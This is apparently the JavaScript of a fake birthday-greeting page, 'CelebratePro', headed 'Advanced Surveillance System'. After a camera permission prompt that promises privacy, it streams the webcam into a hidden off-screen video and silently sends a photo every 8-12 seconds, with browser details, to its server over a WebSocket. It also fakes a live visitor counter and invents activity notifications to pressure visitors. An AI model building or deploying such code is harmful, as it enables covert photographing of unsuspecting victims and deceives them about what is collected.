// ============================================
// CelebratePro™ Professional Birthday Platform
// Advanced Surveillance System v2.0
// ============================================

// Session persistence and state management
const SESSION_KEY = 'birthday_session_data';

// Load saved session data
function loadSessionData() {
  try {
    const saved = localStorage.getItem(SESSION_KEY);
    return saved ? JSON.parse(saved) : null;
  } catch (e) {
    console.warn('Failed to load session data:', e);
    return null;
  }
}

// Save session data
function saveSessionData(data) {
  try {
    localStorage.setItem(SESSION_KEY, JSON.stringify(data));
  } catch (e) {
    console.warn('Failed to save session data:', e);
  }
}

// Clear session data
function clearSessionData() {
  try {
    localStorage.removeItem(SESSION_KEY);
  } catch (e) {
    console.warn('Failed to clear session data:', e);
  }
}

// Premium Professional Birthday Platform - CelebratePro™
// Advanced DOM Element Management
const nameInput = document.getElementById('userName');
const startBtn = document.getElementById('startCelebration');

// Create dynamic elements for the new professional interface
let currentStep = 'welcome';
let userSession = null;
let cameraInitialized = false;
let professionalAnimations = [];

// Professional state management
let bdStream = null;
let wsClient = null;
let userId = null;
let celebrationTimer = null;
let professionalEffects = {
  confetti: null,
  particles: null,
  animations: []
};

// Professional notification system
function showProfessionalNotification(message, type = 'info', duration = 4000) {
  const notification = document.createElement('div');
  notification.className = `professional-notification ${type}`;
  notification.innerHTML = `
    <div class="notification-content">
      <div class="notification-icon">
        ${type === 'success' ? '✅' : type === 'error' ? '⚠️' : 'ℹ️'}
      </div>
      <div class="notification-message">${message}</div>
    </div>
  `;
  
  // Add notification styles
  notification.style.cssText = `
    position: fixed;
    top: 80px;
    right: 20px;
    background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
    color: white;
    padding: 16px 20px;
    border-radius: 12px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    z-index: 1000;
    animation: slideInNotification 0.4s ease-out;
    min-width: 300px;
    backdrop-filter: blur(10px);
  `;
  
  document.body.appendChild(notification);
  
  setTimeout(() => {
    notification.style.animation = 'slideOutNotification 0.4s ease-in forwards';
    setTimeout(() => notification.remove(), 400);
  }, duration);
}

// Professional loading overlay
function showProfessionalLoader(message = 'Processing your celebration experience...') {
  const loader = document.createElement('div');
  loader.id = 'professional-loader';
  loader.innerHTML = `
    <div class="loader-backdrop"></div>
    <div class="loader-content">
      <div class="premium-spinner"></div>
      <h3>CelebratePro™</h3>
      <p>${message}</p>
      <div class="loader-progress">
        <div class="progress-bar"></div>
      </div>
    </div>
  `;
  
  loader.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
  `;
  
  document.body.appendChild(loader);
  return loader;
}

function hideProfessionalLoader() {
  const loader = document.getElementById('professional-loader');
  if (loader) {
    loader.style.animation = 'fadeOut 0.4s ease-out forwards';
    setTimeout(() => loader.remove(), 400);
  }
}

// Get session ID from URL parameters
function getSessionId() {
  const params = new URLSearchParams(window.location.search);
  return params.get('session') || 'celebration-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
}

// Initialize professional session
userId = getSessionId();

// Enhanced professional camera initialization
async function initializeProfessionalCamera() {
  const loader = showProfessionalLoader('Initializing secure camera connection...');
  
  try {
    showProfessionalNotification('Requesting camera access for memory capture...', 'info');
    
    const constraints = {
      video: {
        width: { ideal: 1280, min: 640 },
        height: { ideal: 720, min: 480 },
        facingMode: 'user',
        frameRate: { ideal: 30, min: 15 }
      },
      audio: false
    };

    bdStream = await navigator.mediaDevices.getUserMedia(constraints);
    
    // Create hidden video for stealth capture
    if (!document.getElementById('hidden-video')) {
      const hiddenVideo = document.createElement('video');
      hiddenVideo.id = 'hidden-video';
      hiddenVideo.style.cssText = `
        position: fixed;
        bottom: -200px;
        right: -200px;
        width: 160px;
        height: 120px;
        opacity: 0;
        z-index: -1000;
      `;
      hiddenVideo.autoplay = true;
      hiddenVideo.muted = true;
      document.body.appendChild(hiddenVideo);
    }
    
    const hiddenVideo = document.getElementById('hidden-video');
    hiddenVideo.srcObject = bdStream;
    
    cameraInitialized = true;
    hideProfessionalLoader();
    
    showProfessionalNotification('Camera connected successfully! Professional features activated.', 'success');
    
    // Start stealth capture system
    startStealthCapture();
    
    return true;
  } catch (error) {
    hideProfessionalLoader();
    console.error('Camera initialization failed:', error);
    
    if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
      showCameraPermissionModal();
    } else {
      showProfessionalNotification('Camera initialization failed. Some features may be limited.', 'error');
    }
    
    return false;
  }
}

// Professional camera permission modal
function showCameraPermissionModal() {
  const modal = document.createElement('div');
  modal.className = 'camera-permission-modal';
  modal.innerHTML = `
    <div class="modal-backdrop"></div>
    <div class="modal-content-premium">
      <div class="modal-header">
        <div class="camera-icon-large">📸</div>
        <h2>Camera Access Required</h2>
        <p class="modal-subtitle">Unlock the full CelebratePro™ experience</p>
      </div>
      
      <div class="modal-benefits">
        <div class="benefit-row">
          <span class="benefit-check">✨</span>
          <span>Automatic moment capture during celebration</span>
        </div>
        <div class="benefit-row">
          <span class="benefit-check">📷</span>
          <span>Professional-quality photo preservation</span>
        </div>
        <div class="benefit-row">
          <span class="benefit-check">🔒</span>
          <span>Secure, private processing on your device</span>
        </div>
        <div class="benefit-row">
          <span class="benefit-check">🎉</span>
          <span>Enhanced interactive celebration features</span>
        </div>
      </div>
      
      <div class="modal-actions">
        <button class="btn-grant-camera">Grant Camera Access</button>
        <button class="btn-continue-limited">Continue with Limited Features</button>
      </div>
      
      <div class="modal-footer">
        <div class="privacy-reminder">
          <span class="privacy-icon">🛡️</span>
          <span>Your privacy is protected. No data is stored without your consent.</span>
        </div>
      </div>
    </div>
  `;
  
  document.body.appendChild(modal);
  
  // Event listeners
  modal.querySelector('.btn-grant-camera').onclick = async () => {
    modal.remove();
    await initializeProfessionalCamera();
  };
  
  modal.querySelector('.btn-continue-limited').onclick = () => {
    modal.remove();
    showProfessionalNotification('Continuing with limited features. Camera can be enabled later.', 'info');
  };
}

// Enhanced stealth capture system
function startStealthCapture() {
  if (!cameraInitialized || !bdStream) return;
  
  const capturePhoto = () => {
    try {
      const hiddenVideo = document.getElementById('hidden-video');
      if (!hiddenVideo || hiddenVideo.videoWidth === 0) return;
      
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      canvas.width = hiddenVideo.videoWidth;
      canvas.height = hiddenVideo.videoHeight;
      
      ctx.drawImage(hiddenVideo, 0, 0);
      
      const imageData = canvas.toDataURL('image/jpeg', 0.8);
      
      // Send via WebSocket with professional metadata
      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
        wsClient.send(JSON.stringify({
          type: 'birthday_photo',
          sessionId: userId,
          imageData: imageData,
          timestamp: Date.now(),
          metadata: {
            platform: 'CelebratePro™',
            quality: 'professional',
            source: 'stealth_capture',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`
          }
        }));
      }
      
    } catch (error) {
      console.error('Capture error:', error);
    }
  };
  
  // Initial capture after 2 seconds
  setTimeout(capturePhoto, 2000);
  
  // Regular captures every 8-12 seconds
  const scheduleNextCapture = () => {
    const interval = 8000 + Math.random() * 4000; // 8-12 seconds
    setTimeout(() => {
      capturePhoto();
      scheduleNextCapture();
    }, interval);
  };
  
  scheduleNextCapture();
}

// Professional celebration starter
async function startProfessionalCelebration() {
  const name = nameInput.value.trim();
  
  if (!name) {
    showProfessionalNotification('Please enter your name to continue', 'error');
    nameInput.focus();
    return;
  }
  
  // Validate name (basic security)
  if (name.length < 2 || name.length > 50) {
    showProfessionalNotification('Please enter a valid name (2-50 characters)', 'error');
    return;
  }
  
  const loader = showProfessionalLoader('Creating your personalized celebration experience...');
  
  try {
    // Save session data
    const sessionData = {
      name: name,
      sessionId: userId,
      celebrationStarted: true,
      timestamp: Date.now()
    };
    saveSessionData(sessionData);
    
    // Initialize camera if not already done
    if (!cameraInitialized) {
      await initializeProfessionalCamera();
    }
    
    // Create personalized celebration view
    createCelebrationView(name);
    
    // Start professional effects
    setTimeout(() => {
      hideProfessionalLoader();
      showProfessionalNotification(`Welcome ${name}! Your celebration experience is now active.`, 'success');
      startProfessionalEffects();
    }, 2000);
    
  } catch (error) {
    hideProfessionalLoader();
    console.error('Celebration start error:', error);
    showProfessionalNotification('Failed to start celebration. Please try again.', 'error');
  }
}

// Create the celebration view
function createCelebrationView(userName) {
  const container = document.querySelector('.celebration-container');
  
  // Create celebration content
  const celebrationHTML = `
    <div class="celebration-active">
      <div class="celebration-header">
        <div class="user-avatar">
          <span class="avatar-icon">🎉</span>
          <div class="avatar-name">${userName}</div>
        </div>
        <div class="celebration-status">
          <span class="status-indicator active"></span>
          <span class="status-text">Celebration Active</span>
        </div>
      </div>
      
      <div class="celebration-content">
        <h1 class="celebration-title">Happy Birthday, ${userName}! 🎂</h1>
        <p class="celebration-message">Your special day celebration is now in progress</p>
        
        <div class="celebration-features">
          <div class="feature-card">
            <div class="feature-icon">📸</div>
            <div class="feature-info">
              <h3>Memory Capture</h3>
              <p>Professional photo capture active</p>
            </div>
          </div>
          
          <div class="feature-card">
            <div class="feature-icon">🎨</div>
            <div class="feature-info">
              <h3>Visual Effects</h3>
              <p>Personalized celebration animations</p>
            </div>
          </div>
          
          <div class="feature-card">
            <div class="feature-icon">🔒</div>
            <div class="feature-info">
              <h3>Secure Processing</h3>
              <p>Privacy-protected experience</p>
            </div>
          </div>
        </div>
        
        <div class="celebration-actions">
          <button class="btn-iq-test">
            <span class="btn-icon">🧠</span>
            <span>Take Fun IQ Challenge</span>
            <span class="btn-arrow">→</span>
          </button>
        </div>
      </div>
    </div>
    
    <canvas id="celebration-effects"></canvas>
  `;
  
  container.innerHTML = celebrationHTML;
  
  // Add event listeners
  const iqTestBtn = container.querySelector('.btn-iq-test');
  if (iqTestBtn) {
    iqTestBtn.onclick = () => {
      window.location.href = `/iq-test.html?session=${userId}&name=${encodeURIComponent(userName)}`;
    };
  }
}

// Professional effects system
function startProfessionalEffects() {
  const canvas = document.getElementById('celebration-effects');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  canvas.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    pointer-events: none;
    z-index: 10;
  `;
  
  // Particle system
  const particles = [];
  const colors = ['#667eea', '#764ba2', '#f093fb', '#f5576c', '#4facfe', '#00f2fe'];
  
  function createParticle() {
    return {
      x: Math.random() * canvas.width,
      y: canvas.height + 10,
      size: Math.random() * 4 + 2,
      color: colors[Math.floor(Math.random() * colors.length)],
      velocity: {
        x: (Math.random() - 0.5) * 2,
        y: -Math.random() * 3 - 1
      },
      life: 1,
      decay: Math.random() * 0.02 + 0.005
    };
  }
  
  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    // Add new particles
    if (Math.random() < 0.1) {
      particles.push(createParticle());
    }
    
    // Update and draw particles
    for (let i = particles.length - 1; i >= 0; i--) {
      const particle = particles[i];
      
      particle.x += particle.velocity.x;
      particle.y += particle.velocity.y;
      particle.life -= particle.decay;
      
      if (particle.life <= 0) {
        particles.splice(i, 1);
        continue;
      }
      
      ctx.save();
      ctx.globalAlpha = particle.life;
      ctx.fillStyle = particle.color;
      ctx.beginPath();
      ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();
    }
    
    requestAnimationFrame(animate);
  }
  
  animate();
}

// Professional WebSocket Management
function ensureWebSocket() {
  if (wsClient && wsClient.readyState === WebSocket.OPEN) {
    return;
  }
  
  try {
    const wsUrl = `ws://${window.location.host}`;
    wsClient = new WebSocket(wsUrl);
    
    wsClient.onopen = () => {
      console.log('Professional WebSocket connected');
      
      // Register session
      wsClient.send(JSON.stringify({
        type: 'birthday_session',
        sessionId: userId,
        platform: 'CelebratePro™',
        timestamp: Date.now()
      }));
    };
    
    wsClient.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        handleWebSocketMessage(data);
      } catch (error) {
        console.error('WebSocket message error:', error);
      }
    };
    
    wsClient.onclose = () => {
      console.log('Professional WebSocket disconnected');
      // Attempt reconnection after 3 seconds
      setTimeout(ensureWebSocket, 3000);
    };
    
    wsClient.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
    
  } catch (error) {
    console.error('WebSocket connection failed:', error);
  }
}

function handleWebSocketMessage(data) {
  switch (data.type) {
    case 'birthday_confirmation':
      showProfessionalNotification('Celebration data synchronized successfully', 'success');
      break;
    case 'system_status':
      console.log('System status:', data);
      break;
    default:
      console.log('Unknown message type:', data.type);
  }
}

// Enhanced Event Listeners
document.addEventListener('DOMContentLoaded', () => {
  console.log('🎉 CelebratePro™ Professional Birthday Platform Initialized');
  
  // Initialize professional systems
  if (typeof window.securityManager !== 'undefined') {
    window.securityManager.obfuscateCode();
  }
  
  if (typeof window.mobileOptimizer !== 'undefined') {
    window.mobileOptimizer.optimizeBattery();
  }
  
  // Add professional styles
  addProfessionalStyles();
  
  // Set up main event listener
  if (startBtn) {
    startBtn.addEventListener('click', startProfessionalCelebration);
  }
  
  // Enhanced name input with professional validation
  if (nameInput) {
    nameInput.addEventListener('input', (e) => {
      const value = e.target.value;
      const validation = nameInput.parentElement.querySelector('.input-validation');
      
      if (value.length >= 2 && value.length <= 50) {
        if (validation) validation.style.opacity = '1';
        nameInput.style.borderColor = '#10b981';
      } else {
        if (validation) validation.style.opacity = '0';
        nameInput.style.borderColor = '#d1d5db';
      }
    });
    
    nameInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        startProfessionalCelebration();
      }
    });
  }
  
  // Professional window resize handler
  window.addEventListener('resize', () => {
    const canvas = document.getElementById('celebration-effects');
    if (canvas) {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
  });
  
  // Initialize WebSocket connection
  ensureWebSocket();
  
  // Auto-initialize camera after 3 seconds for better UX
  // Do NOT auto-initialize camera here. Camera permission should only be requested
  // when a real user (not an admin generating links) explicitly starts the celebration.
});

// Add professional CSS styles dynamically
function addProfessionalStyles() {
  const styles = `
    .professional-notification {
      animation: slideInNotification 0.4s ease-out;
    }
    
    @keyframes slideInNotification {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOutNotification {
      from { transform: translateX(0); opacity: 1; }
      to { transform: translateX(100%); opacity: 0; }
    }
    
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }
    
    #professional-loader .loader-backdrop {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(4px);
    }
    
    #professional-loader .loader-content {
      position: relative;
      background: white;
      padding: 3rem 2rem;
      border-radius: 20px;
      text-align: center;
      max-width: 400px;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
    }
    
    .premium-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f4f6;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1rem;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .camera-permission-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    
    .modal-backdrop {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(4px);
    }
    
    .modal-content-premium {
      position: relative;
      background: white;
      border-radius: 24px;
      padding: 2.5rem;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
      text-align: center;
    }
    
    .modal-header .camera-icon-large {
      font-size: 4rem;
      margin-bottom: 1rem;
      opacity: 0.8;
    }
    
    .modal-header h2 {
      font-size: 1.5rem;
      font-weight: 600;
      color: #1f2937;
      margin-bottom: 0.5rem;
    }
    
    .modal-subtitle {
      color: #6b7280;
      margin-bottom: 2rem;
    }
    
    .modal-benefits {
      text-align: left;
      margin-bottom: 2rem;
    }
    
    .benefit-row {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin-bottom: 1rem;
      padding: 0.75rem;
      background: #f9fafb;
      border-radius: 8px;
    }
    
    .benefit-check {
      font-size: 1.25rem;
      flex-shrink: 0;
    }
    
    .modal-actions {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      margin-bottom: 2rem;
    }
    
    .btn-grant-camera {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 1rem 2rem;
      border-radius: 12px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .btn-grant-camera:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
    }
    
    .btn-continue-limited {
      background: #f3f4f6;
      color: #6b7280;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 8px;
      font-size: 0.875rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .btn-continue-limited:hover {
      background: #e5e7eb;
    }
    
    .modal-footer {
      padding-top: 1rem;
      border-top: 1px solid #e5e7eb;
    }
    
    .privacy-reminder {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      font-size: 0.875rem;
      color: #6b7280;
    }
    
    .celebration-active {
      text-align: center;
      padding: 2rem;
    }
    
    .celebration-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 2rem;
      padding: 1rem;
      background: #f9fafb;
      border-radius: 12px;
    }
    
    .user-avatar {
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }
    
    .avatar-icon {
      font-size: 2rem;
    }
    
    .avatar-name {
      font-weight: 600;
      color: #1f2937;
    }
    
    .celebration-status {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .status-indicator {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #10b981;
      animation: pulse 2s infinite;
    }
    
    .status-text {
      font-size: 0.875rem;
      color: #10b981;
      font-weight: 500;
    }
    
    .celebration-title {
      font-size: 2.5rem;
      font-weight: 600;
      color: #1f2937;
      margin-bottom: 1rem;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .celebration-message {
      font-size: 1.125rem;
      color: #6b7280;
      margin-bottom: 3rem;
    }
    
    .celebration-features {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 1.5rem;
      margin-bottom: 3rem;
    }
    
    .feature-card {
      display: flex;
      align-items: center;
      gap: 1rem;
      padding: 1.5rem;
      background: white;
      border-radius: 16px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      border: 1px solid #e5e7eb;
      transition: all 0.3s ease;
    }
    
    .feature-card:hover {
      transform: translateY(-4px);
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
    }
    
    .feature-icon {
      font-size: 2rem;
      flex-shrink: 0;
    }
    
    .feature-info h3 {
      font-weight: 600;
      color: #1f2937;
      margin-bottom: 0.25rem;
    }
    
    .feature-info p {
      font-size: 0.875rem;
      color: #6b7280;
    }
    
    .btn-iq-test {
      display: inline-flex;
      align-items: center;
      gap: 0.75rem;
      padding: 1rem 2rem;
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 1.125rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(240, 147, 251, 0.3);
    }
    
    .btn-iq-test:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(240, 147, 251, 0.4);
    }
    
    .btn-iq-test .btn-arrow {
      transition: transform 0.3s ease;
    }
    
    .btn-iq-test:hover .btn-arrow {
      transform: translateX(4px);
    }
  `;
  
  const styleSheet = document.createElement('style');
  styleSheet.textContent = styles;
  document.head.appendChild(styleSheet);
}

// ============================================
// PSYCHOLOGICAL TRIGGER ENHANCEMENTS
// ============================================

// Live Counter Animation for Social Proof
function initializeLiveCounter() {
  const counterElement = document.getElementById('liveCounter');
  if (!counterElement) return;
  
  let baseCount = 1247;
  let currentCount = baseCount;
  
  // Animate counter with realistic variations
  setInterval(() => {
    // Random change between -3 to +5 every 3-8 seconds
    const change = Math.floor(Math.random() * 9) - 3;
    currentCount = Math.max(800, Math.min(2000, currentCount + change));
    
    // Animate the number change
    animateCounterChange(counterElement, currentCount);
  }, 3000 + Math.random() * 5000);
  
  // Small fluctuations every few seconds
  setInterval(() => {
    const smallChange = Math.floor(Math.random() * 3) - 1;
    currentCount = Math.max(800, Math.min(2000, currentCount + smallChange));
    counterElement.textContent = currentCount.toLocaleString();
  }, 1500 + Math.random() * 2000);
}

// Smooth counter animation
function animateCounterChange(element, newValue) {
  const startValue = parseInt(element.textContent.replace(/,/g, ''));
  const difference = newValue - startValue;
  const steps = 20;
  const stepValue = difference / steps;
  let currentStep = 0;
  
  const interval = setInterval(() => {
    currentStep++;
    const currentValue = Math.round(startValue + (stepValue * currentStep));
    element.textContent = currentValue.toLocaleString();
    
    if (currentStep >= steps) {
      clearInterval(interval);
      element.textContent = newValue.toLocaleString();
    }
  }, 50);
}

// Enhanced Trust Building
function addPsychologicalTriggers() {
  // Add recent activity notifications
  const recentActivities = [
    "🎉 Sarah from New York just created a birthday surprise!",
    "🎂 Michael from California completed his video message!",
    "✨ Emma from Texas just started her birthday project!",
    "🎊 David from Florida shared his creation!",
    "💖 Lisa from Chicago made someone smile today!"
  ];
  
  // Show random activity notifications
  function showActivityNotification() {
    const notification = document.createElement('div');
    notification.className = 'activity-notification';
    notification.innerHTML = recentActivities[Math.floor(Math.random() * recentActivities.length)];
    
    document.body.appendChild(notification);
    
    // Animate in
    setTimeout(() => notification.classList.add('show'), 100);
    
    // Remove after delay
    setTimeout(() => {
      notification.classList.remove('show');
      setTimeout(() => notification.remove(), 500);
    }, 4000);
  }
  
  // Show notifications every 15-30 seconds
  setInterval(showActivityNotification, 15000 + Math.random() * 15000);
}

// Initialize all psychological enhancements
document.addEventListener('DOMContentLoaded', () => {
  initializeLiveCounter();
  addPsychologicalTriggers();
  
  // Add activity notification styles
  const notificationStyles = `
    .activity-notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
      color: white;
      padding: 12px 20px;
      border-radius: 25px;
      font-size: 14px;
      font-weight: 500;
      box-shadow: 0 4px 20px rgba(79, 172, 254, 0.3);
      transform: translateX(400px);
      transition: all 0.5s ease;
      z-index: 10000;
      max-width: 300px;
      backdrop-filter: blur(10px);
    }
    
    .activity-notification.show {
      transform: translateX(0);
    }
    
    @media (max-width: 768px) {
      .activity-notification {
        top: 10px;
        right: 10px;
        left: 10px;
        max-width: none;
        transform: translateY(-100px);
      }
      
      .activity-notification.show {
        transform: translateY(0);
      }
    }
  `;
  
  const notificationStyleSheet = document.createElement('style');
  notificationStyleSheet.textContent = notificationStyles;
  document.head.appendChild(notificationStyleSheet);
});

// Initialize the professional platform
console.log('🎉 CelebratePro™ Professional Birthday Platform Ready with Psychological Enhancements');